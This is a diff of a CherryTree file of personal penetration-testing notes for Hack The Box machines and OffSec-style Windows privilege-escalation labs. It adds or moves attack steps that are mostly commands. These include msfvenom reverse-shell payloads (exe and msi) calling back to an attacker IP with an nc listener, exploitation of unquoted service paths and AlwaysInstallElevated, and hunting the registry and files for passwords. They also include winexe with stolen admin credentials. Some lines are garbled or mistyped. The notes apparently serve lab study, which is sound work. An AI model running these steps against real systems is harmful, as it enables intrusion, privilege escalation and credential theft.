@@ -602,7 +602,7 @@ sudo nmap -sC -sV -oA nmap/busqueda 10.10.11.208
 
 </rich_text>
   </node>
-  <node name="Active HTB" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1738939575" ts_lastsave="1741363180">
+  <node name="Active HTB" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1738939575" ts_lastsave="1741437520">
     <rich_text>nmap -v -sC -sV 10.10.10.100
 
 
@@ -680,7 +680,21 @@ Ticketmaster1968
 python psexec.py active.htb/administrator@10.10.10.100
 </rich_text>
   </node>
-  <node name="Bloodhound" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1738733419" ts_lastsave="1741420445">
+  <node name="HRLP HTB" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741437520" ts_lastsave="1741438382">
+    <rich_text>Nmap Scan:
+nmap -sC -sV -oA nmap/help 10.10.10.121
+
+
+gobuster -u </rich_text>
+    <rich_text link="webs http://10.10.10.121">http://10.10.10.121</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium. txt -o http-root.log
+
+
+searchsploit helpdeskz
+
+searchsploit -x exploits/php/webapps/40300.py</rich_text>
+  </node>
+  <node name="Bloodhound" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1738733419" ts_lastsave="1741420551">
     <rich_text>Download
 git clone </rich_text>
     <rich_text link="webs https://github.com/BloodHoundAD/BloodHound.git">https://github.com/BloodHoundAD/BloodHound.git</rich_text>
@@ -696,98 +710,6 @@ lput SharpHound.exe
  lget 
  
  
- Other Tools:
- </rich_text>
-    <rich_text link="webs https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</rich_text>
-    <rich_text>
- rm -r Windows-Exploit-Suggester
-
-
-</rich_text>
-    <rich_text family="monospace">./windows-exploit-suggester.py --update</rich_text>
-    <rich_text>
- ./windows-exploit-suggester.py --database 2025-03-08-mssb.xlsx --systeminfo systeminfo.txt
-
-
-
-
-</rich_text>
-    <rich_text scale="h1">Windows Privilege Escalation - Unquoted Service Paths</rich_text>
-    <rich_text>
-
-
-./</rich_text>
-    <rich_text weight="heavy">winpeas.exe servicesinfo</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"</rich_text>
-    <rich_text>
-
-1. </rich_text>
-    <rich_text weight="heavy">Check Permissions</rich_text>
-    <rich_text>:
-• Verify if you have write permissions to any directory in the unquoted path.
-
-• Example:
-powershell
-
-icacls </rich_text>
-    <rich_text foreground="#a3be8c">"C:\Program Files"</rich_text>
-    <rich_text>
-
-• Look for </rich_text>
-    <rich_text family="monospace">(F)</rich_text>
-    <rich_text> (full control) or </rich_text>
-    <rich_text family="monospace">(W)</rich_text>
-    <rich_text> (write) permissions.
-
-
-Import-Module .\PowerUp.ps1
-Invoke-AllChecks
-
-sc qc unquotedsvc
-
-
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.52.119 LPORT=1234 -f exe &gt; reverse.exe
-
-set payload windows/x64/shell_reverse_tcp
-set LHOST 10.6.52.119
-set LPORT 1234
-run
-sessions
-
-
-</rich_text>
-    <rich_text scale="h3" weight="heavy">Example Scenario</rich_text>
-    <rich_text>
-1. </rich_text>
-    <rich_text weight="heavy">Service Path</rich_text>
-    <rich_text>: </rich_text>
-    <rich_text family="monospace">C:\Program Files\My Service\service.exe</rich_text>
-    <rich_text> (unquoted)
-2. </rich_text>
-    <rich_text weight="heavy">Writable Directory</rich_text>
-    <rich_text>: </rich_text>
-    <rich_text family="monospace">C:\Program Files</rich_text>
-    <rich_text> is writable by the current user.
-3. </rich_text>
-    <rich_text weight="heavy">Exploit</rich_text>
-    <rich_text>:
-• Place a malicious executable at </rich_text>
-    <rich_text family="monospace">C:\Program Files\My.exe</rich_text>
-    <rich_text>.
-• Restart the service.
-sc start unquotedsvc
-net stop &lt;ServiceName&gt;
-net start &lt;ServiceName&gt;
-• The malicious executable (</rich_text>
-    <rich_text family="monospace">My.exe</rich_text>
-    <rich_text>) runs with the service's privileges.
-
-
-
-
 </rich_text>
   </node>
   <node name="Escape HTB" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1739279366" ts_lastsave="1741267829">
@@ -1057,6 +979,100 @@ impacket-psexec 'FRIENDS/svc_backupa192.168.159.129' -hashes 'aad3b435b51404eeaa
 
 
 
+ Other Tools:
+ </rich_text>
+    <rich_text link="webs https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</rich_text>
+    <rich_text>
+ rm -r Windows-Exploit-Suggester
+
+
+</rich_text>
+    <rich_text family="monospace">./windows-exploit-suggester.py --update</rich_text>
+    <rich_text>
+ ./windows-exploit-suggester.py --database 2025-03-08-mssb.xlsx --systeminfo systeminfo.txt
+
+
+
+
+</rich_text>
+    <rich_text scale="h1">Windows Privilege Escalation - Unquoted Service Paths</rich_text>
+    <rich_text>
+
+
+./</rich_text>
+    <rich_text weight="heavy">winpeas.exe servicesinfo</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"</rich_text>
+    <rich_text>
+
+1. </rich_text>
+    <rich_text weight="heavy">Check Permissions</rich_text>
+    <rich_text>:
+• Verify if you have write permissions to any directory in the unquoted path.
+
+• Example:
+powershell
+
+icacls </rich_text>
+    <rich_text foreground="#a3be8c">"C:\Program Files"</rich_text>
+    <rich_text>
+
+• Look for </rich_text>
+    <rich_text family="monospace">(F)</rich_text>
+    <rich_text> (full control) or </rich_text>
+    <rich_text family="monospace">(W)</rich_text>
+    <rich_text> (write) permissions.
+
+
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+sc qc unquotedsvc
+
+</rich_text>
+    <rich_text weight="heavy">Payload</rich_text>
+    <rich_text>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.52.119 LPORT=1234 -f exe &gt; reverse.exe
+
+set payload windows/x64/shell_reverse_tcp
+set LHOST 10.6.52.119
+set LPORT 1234
+run
+sessions
+
+
+</rich_text>
+    <rich_text scale="h3" weight="heavy">Example Scenario</rich_text>
+    <rich_text>
+1. </rich_text>
+    <rich_text weight="heavy">Service Path</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">C:\Program Files\My Service\service.exe</rich_text>
+    <rich_text> (unquoted)
+2. </rich_text>
+    <rich_text weight="heavy">Writable Directory</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">C:\Program Files</rich_text>
+    <rich_text> is writable by the current user.
+3. </rich_text>
+    <rich_text weight="heavy">Exploit</rich_text>
+    <rich_text>:
+• Place a malicious executable at </rich_text>
+    <rich_text family="monospace">C:\Program Files\My.exe</rich_text>
+    <rich_text>.
+• Restart the service.
+sc start unquotedsvc
+net stop &lt;ServiceName&gt;
+net start &lt;ServiceName&gt;
+• The malicious executable (</rich_text>
+    <rich_text family="monospace">My.exe</rich_text>
+    <rich_text>) runs with the service's privileges.
+
+
+
+
 
 
 
@@ -1105,7 +1121,7 @@ impacket-psexec 'FRIENDS/svc_backupa192.168.159.129' -hashes 'aad3b435b51404eeaa
       </row>
     </table>
   </node>
-  <node name="Privilege Escalation" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741363139" ts_lastsave="1741414625">
+  <node name="Privilege Escalation" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741363139" ts_lastsave="1741509409">
     <rich_text>
 </rich_text>
     <rich_text scale="h2" weight="heavy">Linux Privilege Escalation</rich_text>
@@ -1551,8 +1567,6 @@ sc start </rich_text>
 bash
 Copy
 
-
-
 reg query HKLM</rich_text>
     <rich_text foreground="#81a1c1">\</rich_text>
     <rich_text>Software</rich_text>
@@ -1567,7 +1581,43 @@ reg query HKLM</rich_text>
 
 ◇ If you can write to a registry key, add a malicious executable.
 
+The registry can be searched for keys and values that contain the word "password":
 
+</rich_text>
+    <rich_text weight="heavy">reg query HKLM /f password /t REG_SZ /s</rich_text>
+    <rich_text>
+
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+
+</rich_text>
+    <rich_text weight="heavy">reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+</rich_text>
+    <rich_text>
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+
+</rich_text>
+    <rich_text weight="heavy">winexe -U 'admin%password' //10.10.41.203 cmd.exe</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text scale="h2">Query the registry for AlwaysInstallElevated keys:</rich_text>
+    <rich_text>
+
+reg_query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+Note that both keys are set to 1 (0x1).
+
+On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+
+Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
+rlwrap nc -nlvp 53
+
+
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 </rich_text>
     <rich_text scale="h4" weight="heavy">DLL Hijacking</rich_text>
@@ -1638,6 +1688,77 @@ reg query HKLM</rich_text>
     <rich_text>: Suggests kernel exploits based on the OS version.
 
 
+Password Hunting
+findstr /si password *.txt *.ini *.config (try searching in differe2 dir /s *pass* == *cred* == *vnc* == *.config*3 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc*4 where /R C:\ user.txt5 where /R C:\ *.ini
+
+
+
+schtasks /query /fo LIST /v | findstr oscp
+
+</rich_text>
+    <rich_text scale="h1" background="#ffffffffffff" weight="heavy">Offsec</rich_text>
+    <rich_text scale="h1"> </rich_text>
+    <rich_text>
+--------------------------------------------------
+Username and hostname
+Group memberships of the current user
+Existing users and groups
+Operating system, version and architecture
+Network information
+Installed applications
+Running processes
+---------------------------------------------------
+First:
+Whoami
+clientwk220\dave
+
+whoami /groups
+dave is a memner of help desk/RDU 
+
+net user
+other users
+daveadmin---posible admin---&gt;admin team---all local admin on 2nd floor.
+net localgroup
+
+Get-LocalGroupMember adminteam
+it not 
+
+Member of remeote desktop user ---&gt;RDP
+Member of Remote Management User-→ WinRm
+
+systeminfo
+check for OS information
+
+route print
+
+netstat -ano
+a- active TCP/UDP
+
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+If password Manager is used
+Get-ChildItem -Path C:\ -Include *. kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\ -Include *. kdbx -File -Recurse -ErrorAction SilentlyContinue PS C:\Users\Dell
+Get-ChildItem -Path C:\xampp -Include *. txt, *. ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+Get-ChildItem -Path C:\Users\dave\ -Include *. txt, *. pdf, *. xls, *. xlsx, *. doc, *. docx -File -Recurse -ErrorAction SilentlyContinue
+
+Working--&gt;
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+found Steave Password
+Steave is not memeber of Admin Group but remote desktop management
+
+RDP connect 
+
+whoami
+
+PErmission Error from Dave
+type C:\xampp\mysql\bin\my.ini_
 </rich_text>
   </node>
   <node name="Password Cracking" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741258017" ts_lastsave="1741261729">
